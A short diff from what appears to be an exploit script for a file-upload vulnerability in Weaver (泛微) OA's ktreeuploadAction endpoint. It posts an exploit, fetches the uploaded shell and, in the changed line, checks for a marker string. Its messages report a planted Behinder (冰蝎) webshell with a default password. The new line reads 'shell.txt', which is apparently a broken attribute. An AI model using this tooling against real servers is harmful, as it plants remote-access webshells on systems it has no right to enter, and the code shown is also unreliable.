@@ -29,7 +29,7 @@ def main(target_url):
         upload = requests.post(exp_url, headers=headers, data=data, verify=False)
         shell=requests.get(shell_url,verify=False)
         if upload.status_code == 200:
-            if shell.status_code == 200:
+            if shell.status_code == 200 and "9df37afc77bdd582d90aefaf4e35c63e" in shell.txt:
                 console.print(now_time() + ' [SUCCESS]  泛微文件上传漏洞存在,冰蝎默认密码:{}'.format(shell_url), style='bold green')
             else:
                 console.print(now_time() + ' [WARNING]  泛微ktreeuploadAction上传漏洞payload执行成功，但木马检测失败哦', style='bold yellow ')
